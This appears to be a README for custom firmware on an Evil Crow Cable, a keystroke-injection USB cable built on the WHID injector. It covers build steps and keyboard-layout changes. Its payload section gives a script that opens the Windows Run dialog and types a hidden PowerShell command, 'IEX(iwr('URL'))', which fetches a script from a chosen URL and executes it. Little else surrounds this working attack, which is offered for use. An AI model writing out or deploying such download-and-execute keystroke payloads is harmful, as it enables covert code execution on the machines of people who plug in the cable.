## Build instructions

1. Start with the installation at [github.com/whid-injector/WHID/wiki#main-requirements](https://github.com/whid-injector/WHID/wiki#main-requirements)
2. replace the files inside [`EvilCrowCable-Pro/@main/firmware`](https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware) with the ones in [this directory](/evil_crow_cable)
3. edit the url at [payload.h](payload.h#L50) based on your needs


## Change Keyboard layout

If the keyboard is availabe at [github.com/whid-injector/WHID/wiki/Keyboards-Layout](https://github.com/whid-injector/WHID/wiki/Keyboards-Layout), use those instructions.

If not available, you can modify the file `Keyboard/src/KeyboardLayout_en_US.cpp` ([`Keyboard` library](https://github.com/arduino-libraries/Keyboard), usually found somewhere at around `%localAppData%/Arduino15/libraries/Keyboard` on Windows) based on your needs. \
An example for that is the file [KeyboardLayout_en_US.cpp](/files/KeyboardLayout_en_US.cpp) for the Swiss-German keyboard layout

## Payloads

Use something like the following to execute a powershell script from an url (replace `URL` accordingly)
```shell
Press:131+114 
Print:powershell -w h "IEX(iwr('URL'))"
Press:176
Press:176
Press:176
Press:176
Press:176
```

> **Note**
> `131+114` here stands for the `WIN` + `r` key combo, and `176` for  `ENTER` ([syntax](https://github.com/whid-injector/WHID/wiki/WHID-Software-SCRIPTING-SYNTAX)) \
> See [github.com/whid-injector/WHID#how-to-start-newbies-edition](https://github.com/whid-injector/WHID?tab=readme-ov-file#how-to-start-newbies-edition) for general usage of the WHID-injector
